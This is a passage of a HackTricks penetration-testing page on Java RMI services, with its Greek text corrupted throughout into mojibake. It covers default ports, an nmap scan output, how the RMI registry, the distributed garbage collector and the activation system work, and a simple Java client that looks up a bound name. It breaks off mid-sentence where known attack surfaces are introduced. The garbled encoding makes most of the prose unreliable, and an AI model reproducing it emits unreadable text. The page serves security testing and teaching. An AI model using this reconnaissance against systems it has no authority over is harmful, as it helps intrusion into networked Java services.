# 1098/1099/1050 - Î•Î»ÎµÎ³Ï‡Î¿Ï‚ Î‘ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ Java RMI - RMI-IIOP

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÏ…Î¸ÏÎ¿Ï Î£Ï…Î½ÎµÏÎ³ÎµÎ¯Î¿Ï… AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ¬Ï†Î¿Ï…**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=1099-pentesting-java-rmi) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚ ÏƒÏ„Î¿Î½ ÎºÏŒÏƒÎ¼Î¿.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=1099-pentesting-java-rmi" %}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

_Î— Î‘Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÎšÎ»Î®ÏƒÎ· ÎœÎµÎ¸ÏŒÎ´Ï‰Î½ Java_, Î® _Java RMI_, ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿ÏƒÏ„ÏÎ±Ï†Î¿ÏÏ‚ _RPC_ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¯Î± _ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î¼Î·Ï‡Î±Î½Î® Java_ Î½Î± ÎºÎ±Î»ÎµÎ¯ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÎµ Î­Î½Î± Î¬Î»Î»Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¹Î± Î¬Î»Î»Î· _ÎµÎ¹ÎºÎ¿Î½Î¹ÎºÎ® Î¼Î·Ï‡Î±Î½Î® Java_. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î½Î± Î³ÏÎ¬Ï†Î¿Ï…Î½ ÎºÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½ÎµÏ‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿ÏƒÏ„ÏÎ±Ï†Î® Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±. ÎœÎ¹Î± ÏƒÏÎ½Ï„Î¿Î¼Î· ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÏƒÏ„Î¿ _Java RMI_ Î±Ï€ÏŒ Î¼Î¹Î± ÎµÏ€Î¹Î¸ÎµÏ„Î¹ÎºÎ® Î¿Ï€Ï„Î¹ÎºÎ® Î³Ï‰Î½Î¯Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ ÏƒÎµ [Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î¿Î¼Î¹Î»Î¯Î± Ï„Î¿Ï… blackhat](https://youtu.be/t\_aw1mDNhzI?t=202).

**Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 1090,1098,1099,1199,4443-4446,8999-9010,9999
```
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
```
Î£Ï…Î½Î®Î¸Ï‰Ï‚, Î¼ÏŒÎ½Î¿ Ï„Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± _Java RMI_ (Ï„Î¿ _RMI Registry_ ÎºÎ±Î¹ Ï„Î¿ _Activation System_) ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î± ÏƒÎµ ÎºÎ¿Î¹Î½Î­Ï‚ Î¸ÏÏÎµÏ‚. Î¤Î± _Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±_ Ï€Î¿Ï… Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÎ® ÎµÏ†Î±ÏÎ¼Î¿Î³Î® _RMI_ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏƒÏ…Î½Î´Î­Î¿Î½Ï„Î±Î¹ ÏƒÎµ Ï„Ï…Ï‡Î±Î¯ÎµÏ‚ Î¸ÏÏÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Î­Î¾Î¿Î´Î¿.

Î¤Î¿ _nmap_ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚ Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÎ¹ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± ÏƒÏ„Î¿ Î½Î± Î±Î½Î±Î³Î½Ï‰ÏÎ¯ÏƒÎµÎ¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ _SSL_ Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎ¿Î½Ï„Î±Î¹ Î¼Îµ _RMI_. Î‘Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯ÏƒÎµÏ„Îµ Î¼Î¹Î± Î¬Î³Î½Ï‰ÏƒÏ„Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± ssl ÏƒÎµ Î¼Î¹Î± ÎºÎ¿Î¹Î½Î® _RMI_ Î¸ÏÏÎ±, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¾ÎµÏ„Î¬ÏƒÎµÏ„Îµ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰.

## Î£Ï„Î¿Î¹Ï‡ÎµÎ¯Î± RMI

Î‘Ï€Î»Î¬, Ï„Î¿ _Java RMI_ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î® Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î­Î½Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ _Java_ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿. Î‘Ï…Ï„ÏŒ Î±Î½Î¿Î¯Î³ÎµÎ¹ Î¼Î¹Î± _TCP_ Î¸ÏÏÎ± ÏŒÏ€Î¿Ï… Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÎºÎ±Î¹ Î½Î± ÎºÎ±Î»Î­ÏƒÎ¿Ï…Î½ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÏ„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î±Ï…Ï„ÏŒ Î±ÎºÎ¿ÏÎ³ÎµÏ„Î±Î¹ Î±Ï€Î»ÏŒ, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î­Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Ï„Î¿ _Java RMI_ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»ÏÏƒÎµÎ¹:

1. Î“Î¹Î± Î½Î± Î´Î¹Î±Î²Î¹Î²Î¬ÏƒÎµÎ¹ Î¼Î¹Î± ÎºÎ»Î®ÏƒÎ· Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î¼Î­ÏƒÏ‰ _Java RMI_, Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î½ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Ï„Î· Î¸ÏÏÎ± Î±ÎºÏÏŒÎ±ÏƒÎ·Ï‚, Ï„Î·Î½ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎ»Î¬ÏƒÎ· Î® Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î¿ `ObjID` Ï„Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏ…Î¼Î­Î½Î¿Ï… Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… (Ï„Î¿ `ObjID` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î¼Î¿Î½Î±Î´Î¹ÎºÏŒ ÎºÎ±Î¹ Ï„Ï…Ï‡Î±Î¯Î¿ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Î³Î¯Î½ÎµÏ„Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î¿ ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿. Î‘Ï€Î±Î¹Ï„ÎµÎ¯Ï„Î±Î¹ ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ _Java RMI_ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Ï€Î¿Î»Î»Î¬ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± Î½Î± Î±ÎºÎ¿ÏÎ½Îµ ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± _TCP_ Î¸ÏÏÎ±).
2. ÎŸÎ¹ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Î¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÎµÏƒÎ¼ÎµÏÎ¿Ï…Î½ Ï€ÏŒÏÎ¿Ï…Ï‚ ÏƒÏ„Î¿Î½ ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î·Ï„Î® ÎºÎ±Î»ÏÎ½Ï„Î±Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ ÏƒÏ„Î¿ ÎµÎºÏ„ÎµÎ¸Î­Î½ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿. Î— _Java virtual machine_ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï€Î¿Î¹Î¿Î¹ Î±Ï€ÏŒ Î±Ï…Ï„Î¿ÏÏ‚ Ï„Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚ ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÎºÎ±Î¹ Ï€Î¿Î¹Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î± ÏƒÏ…Î»Î»Î¿Î³Î®Ï‚ ÏƒÎºÎ¿Ï…Ï€Î¹Î´Î¹ÏÎ½.

Î— Ï€ÏÏÏ„Î· Ï€ÏÏŒÎºÎ»Î·ÏƒÎ· Î»ÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ _RMI registry_, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ ÎµÎ¯Î½Î±Î¹ Î²Î±ÏƒÎ¹ÎºÎ¬ Î­Î½Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¿Î½Î¿Î¼Î±Ï„Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Î³Î¹Î± Ï„Î¿ _Java RMI_. Î¤Î¿ Î¯Î´Î¹Î¿ Ï„Î¿ _RMI registry_ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _RMI_, Î±Î»Î»Î¬ Î· Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Ï„Î¿ `ObjID` ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î±Î¸ÎµÏÎ¬ ÎºÎ±Î¹ Î³Î½Ï‰ÏƒÏ„Î¬ Î±Ï€ÏŒ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ _RMI_. Î‘Ï…Ï„ÏŒ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ _RMI_ Î½Î± ÎºÎ±Ï„Î±Î½Î±Î»ÏÎ½Î¿Ï…Î½ Ï„Î¿ _RMI registry_ Î±Ï€Î»ÏÏ‚ Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î· _TCP_ Î¸ÏÏÎ±.

ÎŒÏ„Î±Î½ Î¿Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¸Î­Î»Î¿Ï…Î½ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Ï„Î± _Java Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¬ Ï„Î¿Ï…Ï‚_ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î± ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿, ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï„Î± ÏƒÏ…Î½Î´Î­Î¿Ï…Î½ ÏƒÎµ Î­Î½Î± _RMI registry_. Î¤Î¿ _registry_ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ (Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· IP, Î¸ÏÏÎ± Î±ÎºÏÏŒÎ±ÏƒÎ·Ï‚, Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÎºÎ»Î¬ÏƒÎ· Î® Î´Î¹ÎµÏ€Î±Ï†Î® ÎºÎ±Î¹ Î· Ï„Î¹Î¼Î® `ObjID`) ÎºÎ±Î¹ Ï„Î¹Ï‚ ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Ï…Ï€ÏŒ Î­Î½Î± Î±Î½Î¸ÏÏÏ€Î¹Î½Î± Î±Î½Î±Î³Î½ÏÏƒÎ¹Î¼Î¿ ÏŒÎ½Î¿Î¼Î± (Ï„Î¿ _bound name_). ÎŸÎ¹ Ï€ÎµÎ»Î¬Ï„ÎµÏ‚ Ï€Î¿Ï… Î¸Î­Î»Î¿Ï…Î½ Î½Î± ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎ¿Ï…Î½ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _RMI_ Î¶Î·Ï„Î¿ÏÎ½ Î±Ï€ÏŒ Ï„Î¿ _RMI registry_ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ _bound name_ ÎºÎ±Î¹ Ï„Î¿ registry ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ·. ÎˆÏ„ÏƒÎ¹, Î· ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î²Î±ÏƒÎ¹ÎºÎ¬ Î· Î¯Î´Î¹Î± Î¼Îµ Î¼Î¹Î± ÏƒÏ…Î½Î·Î¸Î¹ÏƒÎ¼Î­Î½Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _DNS_. Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î­Î½Î± Î¼Î¹ÎºÏÏŒ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:
```java
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;

public class ExampleClient {

private static final String remoteHost = "172.17.0.2";
private static final String boundName = "remote-service";

public static void main(String[] args)
{
try {
Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
String response = ref.remoteMethod();                           // Call a remote method

} catch( Exception e) {
e.printStackTrace();
}
}
}
```
Î¤Î¿ Î´ÎµÏÏ„ÎµÏÎ¿ Î±Ï€ÏŒ Ï„Î± Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Î± Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Î»ÏÎ½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ _ÎšÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î¿ Î£Ï…Î»Î»Î­ÎºÏ„Î· Î£ÎºÎ¿Ï…Ï€Î¹Î´Î¹ÏÎ½_ (_DGC_). Î‘Ï…Ï„Î® ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î¬Î»Î»Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _RMI_ Î¼Îµ Î¼Î¹Î± Î³Î½Ï‰ÏƒÏ„Î® Ï„Î¹Î¼Î® `ObjID` ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î· ÏƒÎµ Î²Î±ÏƒÎ¹ÎºÎ¬ ÎºÎ¬Î¸Îµ _RMI ÏƒÎ·Î¼ÎµÎ¯Î¿ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚_. ÎŒÏ„Î±Î½ Î­Î½Î±Ï‚ _Ï€ÎµÎ»Î¬Ï„Î·Ï‚ RMI_ Î±ÏÏ‡Î¯Î¶ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± _RMI_, ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î¼Î¹Î± Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î± ÏƒÏ„Î¿Î½ _DGC_ ÏŒÏ„Î¹ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ _Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿_ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹. ÎŸ _DGC_ Î¼Ï€Î¿ÏÎµÎ¯ Ï„ÏŒÏ„Îµ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î¿Î½ Î¼ÎµÏ„ÏÎ·Ï„Î® Î±Î½Î±Ï†Î¿ÏÏÎ½ ÎºÎ±Î¹ Î½Î± ÎºÎ±Î¸Î±ÏÎ¯Î¶ÎµÎ¹ Ï„Î± Î±Î½ÎµÎºÏ‡ÏÏÎ·Ï„Î± Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î±.

ÎœÎ±Î¶Î¯ Î¼Îµ Ï„Î¿ Î±Ï€Î¿ÏƒÎ¹Ï‰Ï€Î·Î¼Î­Î½Î¿ _Î£ÏÏƒÏ„Î·Î¼Î± Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚_, Î±Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ Ï„Î± Ï„ÏÎ¯Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± Ï„Î¿Ï… _Java RMI_:

1. Î¤Î¿ _ÎœÎ·Ï„ÏÏÎ¿ RMI_ (`ObjID = 0`)
2. Î¤Î¿ _Î£ÏÏƒÏ„Î·Î¼Î± Î•Î½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚_ (`ObjID = 1`)
3. ÎŸ _ÎšÎ±Ï„Î±Î½ÎµÎ¼Î·Î¼Î­Î½Î¿Ï‚ Î£Ï…Î»Î»Î­ÎºÏ„Î·Ï‚ Î£ÎºÎ¿Ï…Ï€Î¹Î´Î¹ÏÎ½_ (`ObjID = 2`)

Î¤Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î± ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Î± Ï„Î¿Ï… _Java RMI_ Î­Ï‡Î¿Ï…Î½ Î³Î½Ï‰ÏƒÏ„Î¬ ÏƒÎ·Î¼ÎµÎ¯Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ Î³Î¹Î± Î±ÏÎºÎµÏ„ÏŒ ÎºÎ±Î¹ÏÏŒ ÎºÎ±Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÎµ Î±Ï€Î±ÏÏ‡Î±Î¹Ï‰Î¼Î­Î½ÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ _Java_. Î‘Ï€ÏŒ Ï„Î·Î½ Î¬Ï€Î¿ÏˆÎ· Ï„Î¿Ï… 